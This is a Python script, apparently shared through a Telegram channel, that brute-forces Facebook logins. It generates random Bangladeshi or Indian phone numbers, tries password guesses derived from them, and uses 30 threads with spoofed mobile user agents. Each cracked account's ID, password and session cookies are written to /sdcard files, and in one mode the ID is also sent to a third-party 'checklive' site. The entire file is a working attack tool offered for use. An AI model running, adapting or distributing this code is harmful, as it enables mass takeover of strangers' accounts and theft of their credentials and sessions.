# SCRIPTS SEND BY : JISAN
#SEND BY.... https://t.me/team_elite_bd
#--------------------• IMPORT •--------------------#
import os,time,base64,zlib,pip,urllib,datetime
from os import path
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#--------------------• LOOP •--------------------#
user=[];ok=[];cp=[];loop=0;ugen=[]
#--------------------• COLOUR •--------------------#
G="\x1b[38;5;46m";W="\x1b[38;5;15m";B="\x1b[38;5;8m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\x1b[38;5;160m";O="\x1b[38;5;81m";X="\x1b[38;5;205m";P="\033[0;34m"
#--------------------• STYLE •--------------------#
xd=f"{G}➤{Y}➤{W}";xd1=f"{G}➤{Y}1{W}";xd2=f"{G}➤{Y}2{W}";xd3=f"{G}➤{Y}3{W}";xd4=f"{G}➤{Y}4{W}";xd5=f"{G}➤{Y}5{W}";xd6=f"{G}➤{Y}6{W}";xd7=f"{G}➤{Y}7{W}";xd8=f"{G}➤{Y}8{W}";xd0=f"{G}➤{Y}0{W}";xdx=f"{G}➤{Y}?{W}";xdxx=f"{G}━{Y}➤{W}"
#--------------------• CLEAR •--------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{W}──────────────────────────────────────────────────')
#--------------------• UA •--------------------#
for swag in range(5000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
#--------------------• DATE •--------------------#
dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
sex1 = datetime.datetime.now().day
sex2 = dic[(str(datetime.datetime.now().month))]
date = f'{G}'+str(sex1)+f'{W}-{G}'+str(sex2)
#--------------------• COLOUR •--------------------#
logo = f"""
       {W}
 ████╗     ██████╗    ████╗
 ██╔██╗   ██╔═══██╗  ██╔██╗
██╔╝██║   ██║   ██║ ██╔╝██║
███████╗  ██║   ██║ ███████╗
╚═══██║██╗██╚═══██║ ╚═══██║
    ╚═╝╚═╝ ╚█████╔╝     ╚═╝
             ╚════╝{Y}2.0
{W}──────────────────────────────────────────────────
{xd} SCRIPT SEND {xdxx} J{Y}I{W}SAN 404
{xd} TOOLS     {xdxx} RANDOM{Y}|{W}CLONING
{xd} STATUS    {xdxx} FREE 🔰
{xd} TELIGERM {xdxx} https://t.me/team_elite_bd
{W}──────────────────────────────────────────────────"""
#--------------------• COLOUR •--------------------#
def ___swag___():
	clear();print(f"{xd1} START RANDOM CLONING ");print(f"{xd0} EXIT CLONING ");linex();chude = input(f'{xdx} SELECT {xdxx} ')
	if chude in ["1"]:__randomx__()
	elif chude in ["0"]:exit()
	else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN SAWAR NATI");time.sleep(1);___swag___()
#--------------------• RANDOM •--------------------#
def __randomx__():
	clear();print(f"{xd1} BANGLADESH RANDOM CLONING ");print(f"{xd2} INDIA RANDOM CLONING ");print(f"{xd3} GMAIL CLONING ");linex();chude = input(f'{xdx} SELECT {xdxx} ')
	if chude in ["1"]:___Bangladesh___()
	elif chude in ["2"]:___India___()
	elif chude in ["0"]:exit()
	else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN SAWAR NATI");time.sleep(1);__randomx__()
#--------------------• RANDOM BANGLADESH •--------------------#
def ___Bangladesh___():
     clear();print(f"{xd} EXAMPLE {xdxx} 017 {Y}|{W} 018 {Y}|{W} 016 {Y}|{W} 019");linex();code = input(f"{xdx} SELECT  {xdxx}{G} ")
     clear();print(f"{xd} EXAMPLE {xdxx} 3000 {Y}|{W} 5000 {Y}|{W} 9999 {Y}|{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx}{G} '))
     clear();print(f"{xd1} SEVER S1 ");print(f"{xd2} SEVER S2 ");linex();methdxd = input(f'{xdx} SELECT {xdxx}{G} ')
     for x in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
     with tred(max_workers=30) as ___love___:
        clear();total=str(len(user))
        print(f"{xd} CODE{Y}|{W}UID{Y}|{W}SERVER {xdxx} {W}{code}{Y}|{W}{total}{Y}|{W}S{methdxd} ");linex()
        for habib in user:
            uid=code + habib
            pss=[uid,habib,uid[5:],uid[4:],uid[:7]]
            if methdxd in ['1']:___love___.submit(___S1___,uid,pss)
            elif methdxd in ['2']:___love___.submit(___S2___,uid,pss)
     print('\033[1;37m');print(f'\n{W}──────────────────────────────────────────────────');print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK{Y}|{W}CP {xdxx} '+str(len(ok))+'|'+str(len(cp)));print(f'\n{W}──────────────────────────────────────────────────');exit()
#--------------------• RANDOM INDIA •--------------------#
def ___India___():
     clear();print(f"{xd} EXAMPLE {xdxx} +91639 {Y}|{W} +91645 {Y}|{W} +91622 {Y}|{W} +91699");linex();code = input(f"{xdx} SELECT  {xdxx}{G} ")
     clear();print(f"{xd} EXAMPLE {xdxx} 3000 {Y}|{W} 5000 {Y}|{W} 9999 {Y}|{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx}{G} '))
     clear();print(f"{xd1} SEVER S1 ");print(f"{xd2} SEVER S2 ");linex();methdxd = input(f'{xdx} SELECT {xdxx}{G} ')
     for x in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
     with tred(max_workers=30) as ___love___:
        clear();total=str(len(user))
        print(f"{xd} CODE{Y}|{W}UID{Y}|{W}SERVER {xdxx} {W}{code}{Y}|{W}{total}{Y}|{W}S{methdxd} ");linex()
        for habib in user:
            uid=code + habib
            pss=[habib,uid[:8],'57273200','59039200','57575751']
            if methdxd in ['1']:___love___.submit(___S1___,uid,pss)
            elif methdxd in ['2']:___love___.submit(___S2___,uid,pss)
     print('\033[1;37m');print(f'\n{W}──────────────────────────────────────────────────');print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK{Y}|{W}CP {xdxx} '+str(len(ok))+'|'+str(len(cp)));print(f'\n{W}──────────────────────────────────────────────────');exit()
#--------------------• RANDOM SERVER S1 •--------------------#
def ___S1___(uid,pss):
    global loop,ok,cp
    try:
        for ps in pss:
            session=requests.Session()
            sys.stdout.write(f'\r{G}➤{Y}➤{W} {date}{Y}|{W}{loop}{Y}|{G}{len(ok)}{Y}|{R}{len(cp)} ');sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            pron_star={'authority': 'x.facebook.com',
            'method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2','sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"',
            'sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document','sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none','sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1','user-agent': pro,'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', coki)[0]
                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={ids}"
                res = requests.get(ckk).text
                if 'live' in res:
                	print(f'\r{G}➤{Y}➤{G} SWAG-OK '+ids+' | '+ps+'\033[1;97m')
                	#print(f"\r{G}➤{Y}➤{G} MALS {Y}•{G} "+coki);linex()
                	open('/sdcard/SWAG-S1-RANDOM-OK-COKIE.txt','a').write(ids+'|'+ps+'|'+coki+'\n')
                	ok.append(ids)
                	break
                else:continue
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                ids = "1000"+coki1[0:11]
                print(f'\r{G}➤{Y}➤{R} SWAG-CP '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/SWAG-S1-RANDOM-CP.txt','a').write(ids+'|'+ps+'\n')
                cp.append(ids)
                break
            else:continue
        loop+=1
    except:
        pass
#--------------------• RANDOM SERVER S2 •--------------------#
def ___S2___(uid,pss):
    global loop,ok,cp
    try:
        for ps in pss:
            session=requests.Session()
            sys.stdout.write(f'\r{G}➤{Y}➤{W} {date}{Y}|{W}{loop}{Y}|{G}{len(ok)}{Y}|{R}{len(cp)} ');sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            pron_star={'authority': 'free.facebook.com',
            'method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2','sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"',
            'sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document','sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none','sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1','user-agent': pro,'viewport-width': '980',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\r{G}➤{Y}➤{G} SWAG-OK '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/SWAG-S2-RANDOM-OK-COKIE.txt','a').write(ids+'|'+ps+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                ids = "1000"+coki1[0:11]
                print(f'\r{G}➤{Y}➤{R} SWAG-CP '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/SWAG-S2-RANDOM-CP.txt','a').write(ids+'|'+ps+'\n')
                cp.append(ids)
                break
            else:continue
        loop+=1
    except:
        pass
#--------------------• END •--------------------#
___swag___()